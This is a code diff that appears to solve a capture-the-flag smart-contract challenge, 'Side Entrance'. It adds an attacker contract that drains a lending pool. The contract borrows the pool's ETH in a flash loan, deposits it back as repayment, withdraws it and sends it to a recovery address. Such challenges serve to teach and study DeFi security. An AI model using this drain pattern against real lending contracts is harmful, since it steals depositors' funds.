@@ -44,7 +44,11 @@ contract SideEntranceChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_sideEntrance() public checkSolvedByPlayer {}
+    function test_sideEntrance() public checkSolvedByPlayer {
+        SideEntranceAttacker attacker = new SideEntranceAttacker(address(pool), recovery);
+
+        attacker.attack();
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -53,4 +57,32 @@ contract SideEntranceChallenge is Test {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
     }
+}
+
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+contract SideEntranceAttacker is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool immutable pool;
+    address immutable recovery;
+
+    constructor(address _pool, address _recovery) {
+        pool = SideEntranceLenderPool(_pool);
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        SafeTransferLib.safeTransferETH(recovery, address(this).balance);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
 }
